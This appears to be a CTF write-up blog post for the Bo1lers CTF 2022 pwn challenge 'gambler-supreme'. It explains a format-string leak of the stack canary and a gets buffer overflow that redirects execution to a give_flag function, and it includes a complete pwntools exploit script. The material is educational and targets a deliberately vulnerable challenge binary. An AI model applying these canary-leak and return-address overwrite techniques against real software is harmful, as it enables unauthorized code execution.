---
title: "[Pwn] gambler-supreme [Bo1lers CTF 2022]"
date: 2022-04-28 23:39:00
---

# 0x0 Introduction

gambler_supreme 50 PointsSOLVED
The Casino, but with a cool new feature!

You must create a flag.txt in the same folder as the binary for it to run.
nc ctf.b01lers.com 9201

Author: robotearthpizza
Difficulty: Hard

files: [gambler_supreme](gambler_supreme)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 0x2 Vulnerability

it marks as hard but actually very easy.

function `sym.casino` ask for a 4 byte string using `gets`, then it compare with a random string generate by `sym.imp.rand()`. In this challenge, the function for print out flag is not called in binary. So we need to control rip and jump to the function.


```
│           ; var signed int64_t var_34h @ rbp-0x34
│           ; var char *format @ rbp-0x30
│           ; var char *s1 @ rbp-0x20
│           ; var int64_t canary @ rbp-0x8
{
    do {
        // generate random string
        sym.imp.gets(&format);
        sym.imp.printf("Your guess: ");
        sym.imp.printf(&format);
        sym.imp.putchar(10);
        sym.imp.printf("Correct word: %s\n", &s1);
        iVar1 = sym.imp.strcmp(&s1);
        // add or subtract balance depend on the result
    } while (_obj.balance < 1000);
    sym.imp.printf("Drats, the cat snuck in and deleted the code for give_flag...");
    return;
}
```

It have both `gets` to overwrite and `printf` to leak data.

using printf, we can leak canary. 

then if we overwrite rip to `give_flag` using `gets`,  the flag when be print when function return.

finally we uses `gets` again, overwrite `s1`,  make `format` and `s1` same. 

# 0x3 Exploit

```
io = start()

io.sendlineafter(b"(inclusive):",b"1")
io.sendlineafter(b"letters: ",b"%13$p")
lp(io.recvuntil(b"Your guess: "))
canary = int(io.recvuntil(b"\n",drop=True),16)
lp("canary",hex(canary))
io.sendlineafter(b"letters: ",flat({
    0x30 - 0x8:canary,
    0x30 + 0x8: exe.sym["give_flag"]
}))
try:
    while True:
        lp(io.sendlineafter(b"letters: ",b"AAAAAAA\x00AAAAAAA\x00"))
except:
    pass
print(io.recv())

io.interactive()
```

# 0x4 Flag

forgot